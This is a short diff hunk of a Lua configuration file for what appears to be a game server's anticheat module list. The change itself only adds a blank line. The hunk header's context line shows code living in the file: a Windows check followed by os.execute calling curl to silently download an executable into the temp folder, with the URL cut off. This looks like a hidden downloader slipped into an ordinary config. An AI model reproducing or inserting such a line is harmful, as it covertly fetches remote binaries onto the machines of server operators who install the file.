@@ -34,3 +34,4 @@ if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https:
     { name = 'fake_events',     params = { 'banPlayer', 'event' },                                                                                      dir = '/anticheat', order = 12, enabled = true  },
     { name = 'objects',         params = { 'BlacklistedObjects' },                                                                                      dir = '/anticheat', order = 13, enabled = true  },
 }
+
